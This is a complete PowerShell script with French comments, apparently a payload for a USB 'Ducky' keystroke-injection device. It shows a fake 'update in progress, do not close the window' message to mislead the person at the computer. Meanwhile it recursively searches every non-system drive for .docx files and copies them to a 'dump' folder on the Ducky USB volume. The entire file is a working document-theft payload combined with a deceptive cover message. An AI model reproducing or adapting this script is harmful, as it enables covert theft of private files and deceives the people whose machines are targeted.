Write-Host "UNE MISE A JOUR EST EN COURS, MERCI DE NE PAS FERMER LA FENETRE"

# Récupère une liste de tous les volumes montés
$drives = Get-WmiObject -Class Win32_LogicalDisk

# Trouve la lettre de lecteur de "Ducky"
$duckyDrive = $drives | Where-Object { $_.VolumeName -eq "Ducky" } | Select-Object -ExpandProperty DeviceID

# Parcourt chaque volume
foreach ($drive in $drives) {
    # Si le volume n'est pas "Ducky" et n'est pas le disque système
    if ($drive.DeviceID -ne $duckyDrive -and $drive.DeviceID -ne "C:") {
        # Affiche les informations du volume
        $drive | Select-Object DeviceID, VolumeName, Description

        # Change le répertoire de travail pour être le répertoire racine du volume
        Set-Location -Path $drive.DeviceID

        # Initialise une liste vide pour les fichiers
        $files = @()

        # Tente de trouver tous les fichiers dans le répertoire courant et ses sous-répertoires
        try {
            $files = Get-ChildItem -Path "*.docx" -Recurse -File -ErrorAction Stop
        }
        catch {
            Write-Host "Erreur lors de la récupération des fichiers : $_"
        }

        foreach ($file in $files) {
            $destinationPath = "${duckyDrive}\\dump\$($file.Name)"
            # Si le fichier n'existe pas déjà dans la destination, le copie
            if (!(Test-Path -Path $destinationPath)) {
                Copy-Item -Path $file.FullName -Destination $destinationPath
            }
        }
    }
}

exit
